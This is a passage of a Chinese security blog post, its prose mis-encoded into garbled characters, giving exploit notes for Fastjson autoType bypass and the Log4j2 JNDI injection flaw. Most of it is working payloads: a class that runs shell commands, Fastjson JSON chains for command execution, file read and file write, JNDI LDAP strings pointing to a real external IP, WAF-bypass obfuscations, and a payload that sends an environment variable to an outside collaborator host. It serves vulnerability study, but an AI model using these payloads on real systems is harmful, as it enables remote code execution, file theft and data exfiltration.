<li>åˆ©ç”¨ç±»å¿…é¡»æ˜¯expectClassç±»çš„å­ç±»æˆ–å®ç°ç±»ï¼Œå¹¶ä¸”ä¸åœ¨é»‘åå•ä¸­ï¼›</li>
</ul>
<p>å…ˆå‡è®¾FastjsonæœåŠ¡ç«¯å­˜åœ¨å¦‚ä¸‹å®ç°AutoCloseableæ¥å£ç±»çš„æ¶æ„ç±»VulAutoCloseableï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">public class VulAutoCloseable implements AutoCloseable &#123;</span><br><span class="line">    public VulAutoCloseable(String cmd) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    @Override</span><br><span class="line">    public void close() throws Exception &#123;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="expä»£ç "><a href="#expä»£ç " class="headerlink" title="expä»£ç "></a>expä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">package org.example.fj2.j4;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class EXP_1268 &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String poc =&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;org.example.fj2.j4.VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;;</span><br><span class="line">        JSON.parse(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250218122403146.png?raw=true" alt="image-20250218122403146"></p>
<p><strong>è¿™é‡Œå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆæ¶æ„ç±»å¿…é¡»è¦ç»§æ‰¿AutoCloseableæ¥å£ç±»ï¼Œå› ä¸ºè¿™é‡ŒexpectClassä¸ºAutoCloseableç±»ã€å› æ­¤æ¶æ„ç±»å¿…é¡»æ˜¯AutoCloseableç±»çš„å­ç±»æ‰èƒ½é€šè¿‡è¿™é‡Œçš„åˆ¤æ–­</strong>ï¼š</p>
<p><strong>å°ç»“ï¼š</strong>å½“ä¼ å…¥checkAutoType()å‡½æ•°çš„expectClasså‚æ•°ä¸ä¸ºnullï¼Œå¹¶ä¸”éœ€è¦åŠ è½½çš„ç›®æ ‡ç±»æ˜¯expectClassç±»çš„å­ç±»æˆ–è€…å®ç°ç±»æ—¶ï¼ˆä¸åœ¨é»‘åå•ä¸­ï¼‰ï¼Œå°±å°†éœ€è¦åŠ è½½çš„ç›®æ ‡ç±»å½“åšæ˜¯æ­£å¸¸çš„ç±»ç„¶åé€šè¿‡è°ƒç”¨TypeUtils.loadClass()å‡½æ•°è¿›è¡ŒåŠ è½½ã€‚</p>
<p>ç¬¬ä¸€ä¸ª <code>@type</code> è¿›å»ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿï¼›ä½†æ˜¯ç¬¬ä¸€ä¸ª <code>@type</code> æ˜¯ä½œä¸ºç¬¬äºŒä¸ªæŒ‡å®šçš„ç±»é‡Œé¢çš„ expectClassã€‚æ‰€ä»¥è¯´ç™½äº†ï¼ŒloadClass å»ä½œç”¨çš„ç±»æ˜¯ç¬¬ä¸€ä¸ª <code>@type</code>ï¼›å¦‚æœè¿™ä¸ª <code>@type</code> æ˜¯å¯æ§çš„æ¶æ„ç±»ï¼Œå¯ä»¥é€ æˆå‘½ä»¤æ‰§è¡Œæ”»å‡»ã€‚,å…³é”®ä»£ç å¦‚ä¸‹ğŸ‘‡</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250218123718382.png?raw=true" alt="image-20250218123718382"></p>
<p>org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfigç±»PoCï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;metricRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;æˆ–&#123;&quot;@type&quot;:&quot;org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig&quot;,&quot;healthCheckRegistry&quot;:&quot;ldap://localhost:1389/Exploit&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>com.caucho.config.types.ResourceRefç±»PoCï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.caucho.config.types.ResourceRef&quot;,&quot;lookupName&quot;: &quot;ldap://localhost:1389/Exploit&quot;, &quot;value&quot;: &#123;&quot;$ref&quot;:&quot;$.value&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>



<h3 id="å®é™…åˆ©ç”¨"><a href="#å®é™…åˆ©ç”¨" class="headerlink" title="å®é™…åˆ©ç”¨"></a>å®é™…åˆ©ç”¨</h3><h4 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><h5 id="åˆ©ç”¨ç±»"><a href="#åˆ©ç”¨ç±»" class="headerlink" title="åˆ©ç”¨ç±»"></a>åˆ©ç”¨ç±»</h5><p><strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong></p>
<h5 id="ä¾èµ–"><a href="#ä¾èµ–" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line"> &lt;groupId&gt;org.aspectj&lt;/groupId&gt;  </span><br><span class="line"> &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;  </span><br><span class="line"> &lt;version&gt;1.9.5&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;C:/Windows/win.ini&quot;, &quot;targetPath&quot;:&quot;D:/wamp64/www/win.txt&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ–‡ä»¶å†™å…¥"><a href="#æ–‡ä»¶å†™å…¥" class="headerlink" title="æ–‡ä»¶å†™å…¥"></a>æ–‡ä»¶å†™å…¥</h4><p><strong>com.esotericsoftware.kryo.io.Output</strong></p>
<h5 id="ä¾èµ–-1"><a href="#ä¾èµ–-1" class="headerlink" title="ä¾èµ–"></a>ä¾èµ–</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;kryo&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.0.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;je&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;5.0.73&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>è§¦å‘å†™æ–‡ä»¶æ“ä½œåˆ™éœ€è¦è°ƒç”¨å…¶flush()å‡½æ•°ï¼š</p>
<p>flush()å‡½æ•°åªæœ‰åœ¨close()å’Œrequire()å‡½æ•°è¢«è°ƒç”¨æ—¶æ‰ä¼šè§¦å‘ï¼Œå…¶ä¸­require()å‡½æ•°åœ¨è°ƒç”¨writeç›¸å…³å‡½æ•°æ—¶ä¼šè¢«è§¦å‘ã€‚</p>
<p>JDKçš„ObjectOutputStreamç±»ï¼Œå…¶å†…éƒ¨ç±»BlockDataOutputStreamçš„æ„é€ å‡½æ•°ä¸­å°†OutputStreamç±»å‹å‚æ•°èµ‹å€¼ç»™outæˆå‘˜å˜é‡ï¼Œè€Œå…¶setBlockDataMode()å‡½æ•°ä¸­è°ƒç”¨äº†drain()å‡½æ•°ã€drain()å‡½æ•°ä¸­åˆè°ƒç”¨äº†out.write()å‡½æ•°</p>
<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;stream&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,</span><br><span class="line">        &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;,</span><br><span class="line">        &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;writer&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,</span><br><span class="line">        &quot;buffer&quot;: &quot;cHduZWQ=&quot;,</span><br><span class="line">        &quot;outputStream&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.stream&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;position&quot;: 5</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;close&quot;: &#123;</span><br><span class="line">        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,</span><br><span class="line">        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,</span><br><span class="line">        &quot;out&quot;: &#123;</span><br><span class="line">            &quot;$ref&quot;: &quot;$.writer&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="68å¾€åå¢åŠ äº†safeMode"><a href="#68å¾€åå¢åŠ äº†safeMode" class="headerlink" title="68å¾€åå¢åŠ äº†safeMode"></a>68å¾€åå¢åŠ äº†safeMode</h2><p>safeModeæ‰“å¼€åï¼Œå®Œå…¨ç¦ç”¨autoTypeã€‚æ‰€æœ‰çš„å®‰å…¨ä¿®å¤ç‰ˆæœ¬sec10ä¹Ÿæ”¯æŒSafeModeé…ç½®ã€‚</p>
<h1 id="Log4j2"><a href="#Log4j2" class="headerlink" title="Log4j2"></a>Log4j2</h1><h2 id="å®˜æ–¹æ–‡æ¡£"><a href="#å®˜æ–¹æ–‡æ¡£" class="headerlink" title="å®˜æ–¹æ–‡æ¡£"></a>å®˜æ–¹æ–‡æ¡£</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://logging.apache.org/log4j/2.x/manual/lookups.html#JavaLookup</span><br></pre></td></tr></table></figure>



<h2 id="åŸºç¡€å¤ç°ä»£ç "><a href="#åŸºç¡€å¤ç°ä»£ç " class="headerlink" title="åŸºç¡€å¤ç°ä»£ç "></a>åŸºç¡€å¤ç°ä»£ç </h2><h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;junit&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;junit&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;4.12&lt;/version&gt;</span><br><span class="line">    &lt;scope&gt;test&lt;/scope&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>

<p>çœ‹ç€æœ‰ç‚¹åƒsstiï¼Œå¦‚ä¸‹â†“</p>
<h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import java.util.function.LongFunction;</span><br><span class="line"></span><br><span class="line">public class Main &#123;</span><br><span class="line">    public static void main( String[] args )</span><br><span class="line">    &#123;</span><br><span class="line">        Logger logger = LogManager.getLogger(LongFunction.class);</span><br><span class="line">        logger.trace(&quot;trace level&quot;);</span><br><span class="line">        logger.debug(&quot;debug level&quot;);</span><br><span class="line">        logger.info(&quot;info level&quot;);</span><br><span class="line">        logger.warn(&quot;warn level&quot;);</span><br><span class="line">        logger.error(&quot;error level&quot;);</span><br><span class="line">        logger.fatal(&quot;fatal level&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="log4j2-xml"><a href="#log4j2-xml" class="headerlink" title="log4j2.xml"></a>log4j2.xml</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;configuration status=&quot;info&quot;&gt;</span><br><span class="line">    &lt;Properties&gt;</span><br><span class="line">        &lt;Property name=&quot;pattern1&quot;&gt;[%-5p] %d %c - %m%n&lt;/Property&gt;</span><br><span class="line">        &lt;Property name=&quot;pattern2&quot;&gt;</span><br><span class="line">            =========================================%n æ—¥å¿—çº§åˆ«ï¼š%p%n æ—¥å¿—æ—¶é—´ï¼š%d%n æ‰€å±ç±»åï¼š%c%n æ‰€å±çº¿ç¨‹ï¼š%t%n æ—¥å¿—ä¿¡æ¯ï¼š%m%n</span><br><span class="line">        &lt;/Property&gt;</span><br><span class="line">        &lt;Property name=&quot;filePath&quot;&gt;logs/myLog.log&lt;/Property&gt;</span><br><span class="line">    &lt;/Properties&gt;</span><br><span class="line">    &lt;appenders&gt; &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;</span><br><span class="line">        &lt;PatternLayout pattern=&quot;$&#123;pattern1&#125;&quot;/&gt;</span><br><span class="line">    &lt;/Console&gt; &lt;RollingFile name=&quot;RollingFile&quot; fileName=&quot;$&#123;filePath&#125;&quot;</span><br><span class="line">                            filePattern=&quot;logs/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log.gz&quot;&gt;</span><br><span class="line">        &lt;PatternLayout pattern=&quot;$&#123;pattern2&#125;&quot;/&gt;</span><br><span class="line">        &lt;SizeBasedTriggeringPolicy size=&quot;5 MB&quot;/&gt;</span><br><span class="line">    &lt;/RollingFile&gt;</span><br><span class="line">    &lt;/appenders&gt;</span><br><span class="line">    &lt;loggers&gt;</span><br><span class="line">        &lt;root level=&quot;info&quot;&gt;</span><br><span class="line">            &lt;appender-ref ref=&quot;Console&quot;/&gt;</span><br><span class="line">            &lt;appender-ref ref=&quot;RollingFile&quot;/&gt;</span><br><span class="line">        &lt;/root&gt;</span><br><span class="line">    &lt;/loggers&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´ä»£ç 1"><a href="#æ¼æ´ä»£ç 1" class="headerlink" title="æ¼æ´ä»£ç 1"></a>æ¼æ´ä»£ç 1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import java.util.function.LongFunction;</span><br><span class="line"></span><br><span class="line">public class RealEnv &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Logger logger = LogManager.getLogger(LongFunction.class);</span><br><span class="line"></span><br><span class="line">        String username = &quot;$&#123;java:os&#125;&quot;;</span><br><span class="line">        //String username = &quot;dddd&quot;;</span><br><span class="line">        if (username != null) &#123;</span><br><span class="line">            logger.info(&quot;User &#123;&#125; login in!&quot;, username);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            logger.error(&quot;User &#123;&#125; not exists&quot;, username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ¼æ´ä»£ç åˆ©ç”¨2"><a href="#æ¼æ´ä»£ç åˆ©ç”¨2" class="headerlink" title="æ¼æ´ä»£ç åˆ©ç”¨2"></a>æ¼æ´ä»£ç åˆ©ç”¨2</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package org.example;</span><br><span class="line"></span><br><span class="line">import org.apache.logging.log4j.LogManager;</span><br><span class="line">import org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line">import java.util.function.LongFunction;</span><br><span class="line"></span><br><span class="line">public class log4j2EXP &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Logger logger = LogManager.getLogger(LongFunction.class);</span><br><span class="line"></span><br><span class="line">        String username = &quot;$&#123;jndi:ldap://127.0.0.1:8085/sUWCwkzH&#125;&quot;;</span><br><span class="line"></span><br><span class="line">        logger.info(&quot;User &#123;&#125; login in!&quot;, username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>æ²¡æ‰¾åˆ°é‚£ä¸ª</p>
<p>PatternLayoutçš„toSerializable()</p>
<p>æ–­ç‚¹è°ƒè¯•ä¸€ç›´è¿›å…¥å°±è¡Œï¼Œç„¶åçœ‹åˆ°å“ªä¸ªç¼ºåŒ…ç›´æ¥ä¸‹è½½æºç å†å…¨å±€æœç´¢å°±è¡Œ</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250221124213691.png?raw=true" alt="image-20250221124213691"></p>
<p>i&#x3D;7â†“</p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250221124311399.png?raw=true" alt="image-20250221124311399"></p>
<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250221124602163.png?raw=true" alt="image-20250221124602163"></p>
<p>ä¸å†™äº†ï¼ŒGitHubå†™çš„å°±æŒºå¥½çš„</p>
<ul>
<li><code>resolver</code>è§£ææ—¶æ”¯æŒçš„å…³é”®è¯æœ‰<code>[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]</code>ï¼Œè€Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨çš„<code>jndi:xxx</code>åç»­å°±ä¼šç”¨åˆ°<code>JndiLookup</code>è¿™ä¸ªè§£æå™¨</li>
<li>è¿™é‡Œæˆ‘ä»¬çœ‹åˆ° <code>resolveVariable()</code> æ–¹æ³•é‡Œé¢æ˜¯è°ƒç”¨äº† <code>lookup()</code> æ–¹æ³•ï¼Œè¿™ä¸ª <code>lookup()</code> æ–¹æ³•ä¹Ÿå°±æ˜¯ jndi é‡Œé¢åŸç”Ÿçš„æ–¹æ³•ï¼Œåœ¨æˆ‘ä»¬è®© jndi å»è°ƒç”¨ ldap æœåŠ¡çš„æ—¶å€™ï¼Œæ˜¯è°ƒç”¨åŸç”Ÿçš„ <code>lookup()</code> æ–¹æ³•çš„ï¼Œæ˜¯å­˜åœ¨æ¼æ´çš„ã€‚</li>
</ul>
<h4 id="ç®€å•wafç»•è¿‡"><a href="#ç®€å•wafç»•è¿‡" class="headerlink" title="ç®€å•wafç»•è¿‡"></a>ç®€å•wafç»•è¿‡</h4><h5 id="ä¸€"><a href="#ä¸€" class="headerlink" title="ä¸€"></a>ä¸€</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;::-J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;</span><br></pre></td></tr></table></figure>

<h5 id="äºŒ"><a href="#äºŒ" class="headerlink" title="äºŒ"></a>äºŒ</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logg.info(&quot;$&#123;$&#123;lower:J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">logg.info(&quot;$&#123;$&#123;upper:j&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">....</span><br></pre></td></tr></table></figure>

<h5 id="ä¸‰"><a href="#ä¸‰" class="headerlink" title="ä¸‰"></a>ä¸‰</h5><p>åˆ©ç”¨ä¸€äº›ç‰¹æ®Šå­—ç¬¦çš„å¤§å°å†™è½¬åŒ–çš„é—®é¢˜</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Ä± =&gt; upper =&gt; i (Java ä¸­æµ‹è¯•å¯è¡Œ)</span><br><span class="line"></span><br><span class="line">Å¿ =&gt; upper =&gt; S (Java ä¸­æµ‹è¯•å¯è¡Œ)</span><br><span class="line"></span><br><span class="line">Ä° =&gt; upper =&gt; i (Java ä¸­æµ‹è¯•ä¸å¯è¡Œ)</span><br><span class="line"></span><br><span class="line">â„ª =&gt; upper =&gt; k (Java ä¸­æµ‹è¯•ä¸å¯è¡Œ)</span><br><span class="line"></span><br><span class="line">logg.error(&quot;$&#123;jnd$&#123;upper:Ä±&#125;:ldap://127.0.0.1:1389/Calc&#125;&quot;);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="å››"><a href="#å››" class="headerlink" title="å››"></a>å››</h5><p>åƒ Jackson å’Œ fastjson åˆæœ‰ unicode å’Œ hex çš„ç¼–ç ç‰¹æ€§ï¼Œæ‰€ä»¥å°±å¯ä»¥å°è¯•ç¼–ç ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;:&quot;\u0024\u007b&quot;&#125;</span><br><span class="line">&#123;&quot;key&quot;:&quot;\x24\u007b&quot;&#125;</span><br></pre></td></tr></table></figure>

<h5 id="äº”"><a href="#äº”" class="headerlink" title="äº”"></a>äº”</h5><p>å¸¸è§„payloadè®°å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://123.56.226.71:1389/Test&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;a:-j&#125;ndi:ldap://br6orhfyoxobjsjbw436loft4kaayz.oastify.com/ExportObject&#125;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line">  </span><br><span class="line">$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1234/ExportObject&#125;&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="å…­"><a href="#å…­" class="headerlink" title="å…­"></a>å…­</h5><p>è¯»å–ç³»ç»Ÿå¯†ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://$&#123;env:LOGNAME&#125;.1hj2a0litb8gvybwuy1m16vj8ae02p.oastify.com&#125;</span><br></pre></td></tr></table></figure>

